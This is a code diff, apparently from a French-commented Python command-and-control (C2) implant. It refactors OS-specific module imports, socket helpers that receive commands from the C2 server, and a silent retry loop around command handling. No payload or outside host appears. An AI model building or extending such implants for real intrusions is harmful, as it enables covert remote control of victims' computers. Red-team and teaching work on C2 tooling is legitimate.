@@ -29,9 +29,9 @@ os_type = platform.system()
 #Detection de l'OS
 
 if os_type == "Windows":
-    from modules.win import *
+    from modules.windows import *
 elif os_type == "Linux":
-    from modules.lin import *
+    from modules.linux import *
 else:
     print("OS non supporté")
     exit()
@@ -51,40 +51,24 @@ def send_bytes(sock, blob: bytes, meta: dict) -> None:
     sock.sendall(len(blob).to_bytes(4, "big") + blob)
 
 
-def _receiveN(sock, n: int) -> bytes | None:
-    """Pour lire n octets d'un message de C2"""
+def _receiveN(sock, n: int) -> bytes:
     buf = b""
     while len(buf) < n:
         chunk = sock.recv(n - len(buf))
         if not chunk:
-            return None
+            raise ConnectionError("connexion coupée")
         buf += chunk
     return buf
 
 
 def receiveBytes(sock) -> bytes:
-    raw_len = _receiveN(sock, 4)
-    if raw_len is None:
-        raise ConnectionError("connexion coupée")
-    blob_len = int.from_bytes(raw_len, "big")
-    data = _receiveN(sock, blob_len)
-    if data is None:
-        raise ConnectionError("données incomplètes")
-    return data
+    blob_len = int.from_bytes(_receiveN(sock, 4), "big")
+    return _receiveN(sock, blob_len)
 
 
 def receiveMessage(sock) -> dict:
-    """Pour recevoir un msg du C2"""
-
-    raw_len = _receiveN(sock, 4)
-    if raw_len is None:
-        raise ConnectionError("connexion coupée par le serveur")
-    
-    data = _receiveN(sock, int.from_bytes(raw_len, "big"))
-
-    if data is None:
-        raise ConnectionError("connexion interrompue en cours de message")
-    return json.loads(data.decode(ENCODING))
+    msg_len = int.from_bytes(_receiveN(sock, 4), "big")
+    return json.loads(_receiveN(sock, msg_len).decode(ENCODING))
 
 
 #Config des commandes exe
@@ -196,8 +180,6 @@ def main():
                     msg = receiveMessage(sock)
                     handle_command(sock, msg)
 
-        except (ConnectionError, ConnectionRefusedError, OSError, json.JSONDecodeError):
-            time.sleep(RETRY_DELAY)
         except Exception:
             time.sleep(RETRY_DELAY)
 
